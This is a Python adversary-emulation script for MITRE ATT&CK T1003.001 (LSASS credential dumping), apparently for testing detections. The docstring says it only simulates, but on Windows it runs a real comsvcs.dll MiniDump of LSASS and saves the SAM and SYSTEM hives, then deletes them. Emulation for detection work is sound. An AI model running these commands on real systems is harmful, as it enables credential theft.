#!/usr/bin/env python3
"""
Adversary Emulation: Credential Access & LSASS Process Inspection
Framework: MITRE ATT&CK T1003.001 (OS Credential Dumping: LSASS Memory)
Author: Nayan Solanki
Purpose: Simulates non-destructive process enumeration and handle queries
         targeting sensitive security binaries to trigger Sysmon Event ID 10.
"""

import argparse
import os
import platform
import subprocess
from engine import BaseAdversaryTechnique

class CredentialDumpSimulator(BaseAdversaryTechnique):
    def __init__(self):
        super().__init__(
            technique_id="T1003.001",
            technique_name="LSASS Memory Dumping",
            tactic="Credential Access"
        )

    def execute(self, target_ip=None, dry_run=False):
        results = {}
        if platform.system().lower() == "windows":
            self.logger.info("[1/5] Querying LSASS Process metadata...")
            if not dry_run:
                cmd_lsass = "powershell -Command \"Get-Process -Name lsass | Select-Object Id, ProcessName, Handles\""
                res1 = subprocess.run(cmd_lsass, shell=True, capture_output=True, text=True)
                self.logger.info(f"      Result: {res1.stdout.strip()}")
                results["lsass_query"] = res1.returncode == 0

            self.logger.info("[2/5] Simulating SAM / SECURITY Registry access query...")
            if not dry_run:
                cmd_reg = "reg query HKLM\\SAM 2>&1"
                res2 = subprocess.run(cmd_reg, shell=True, capture_output=True, text=True)
                self.logger.info(f"      Registry Output: {res2.stdout.strip()[:100]}...")
                results["reg_query"] = res2.returncode == 0

            self.logger.info("[3/5] Simulating credential staging artifact in Temp directory...")
            if not dry_run:
                cmd_stage = "powershell -Command \"New-Item -Path $env:TEMP\\staged_creds_test.tmp -ItemType File -Force\""
                subprocess.run(cmd_stage, shell=True, capture_output=True, text=True)
                results["staged_artifact"] = True
                self.created_artifacts.append(os.path.expandvars("%TEMP%\\staged_creds_test.tmp"))

            self.logger.info("[4/5] Simulating comsvcs.dll LSASS Memory MiniDump...")
            if not dry_run:
                try:
                    pid_res = subprocess.run("powershell -Command \"(Get-Process lsass).Id\"", shell=True, capture_output=True, text=True)
                    lsass_pid = pid_res.stdout.strip()
                except Exception:
                    lsass_pid = "9999"
                if not lsass_pid or not lsass_pid.isdigit():
                    lsass_pid = "9999"

                dump_path = os.path.expandvars("%TEMP%\\lsass_comsvcs_test.dmp")
                cmd_comsvcs = f"rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump {lsass_pid} {dump_path} full"
                self.logger.info(f"      Executing: {cmd_comsvcs}")
                res3 = subprocess.run(cmd_comsvcs, shell=True, capture_output=True, text=True)
                self.logger.info(f"      MiniDump Return Code: {res3.returncode} (Expected fail if not admin)")
                results["comsvcs_dump"] = True
                self.created_artifacts.append(dump_path)

            self.logger.info("[5/5] Simulating offline SAM/SYSTEM Registry Hive saving...")
            if not dry_run:
                sam_path = os.path.expandvars("%TEMP%\\sam_hive_test.hiv")
                system_path = os.path.expandvars("%TEMP%\\system_hive_test.hiv")
                cmd_sam = f"reg save HKLM\\SAM {sam_path} /y"
                cmd_sys = f"reg save HKLM\\SYSTEM {system_path} /y"
                
                self.logger.info(f"      Executing: {cmd_sam}")
                res4 = subprocess.run(cmd_sam, shell=True, capture_output=True, text=True)
                self.logger.info(f"      Reg Save SAM Return Code: {res4.returncode}")
                
                self.logger.info(f"      Executing: {cmd_sys}")
                res5 = subprocess.run(cmd_sys, shell=True, capture_output=True, text=True)
                self.logger.info(f"      Reg Save SYSTEM Return Code: {res5.returncode}")
                
                results["reg_save_hives"] = True
                self.created_artifacts.append(sam_path)
                self.created_artifacts.append(system_path)
        else:
            self.logger.info("[*] Running on non-Windows environment (Simulated Mode).")
            self.logger.info("    Command simulated: Get-Process lsass | Select Handles")
            self.logger.info("    Command simulated: reg query HKLM\\SAM")
            self.logger.info("    Command simulated: rundll32.exe comsvcs.dll, MiniDump <pid> lsass.dmp full")
            self.logger.info("    Command simulated: reg save HKLM\\SAM sam.hiv")
            results["simulated"] = True

        return results

    def cleanup(self):
        if platform.system().lower() == "windows" and self.created_artifacts:
            self.logger.info("Cleaning up credential staging artifacts...")
            for artifact in self.created_artifacts:
                if os.path.exists(artifact):
                    try:
                        os.remove(artifact)
                        self.logger.info(f"      Deleted: {artifact}")
                    except Exception as e:
                        self.logger.warning(f"      Failed to delete {artifact}: {e}")
            self.created_artifacts = []
        return True

def main():
    parser = argparse.ArgumentParser(description="Simulate Credential Access & LSASS Discovery")
    parser.add_argument("--dry-run", action="store_true")
    args = parser.parse_args()

    simulator = CredentialDumpSimulator()
    simulator.execute(dry_run=args.dry_run)
    simulator.cleanup()

if __name__ == "__main__":
    main()
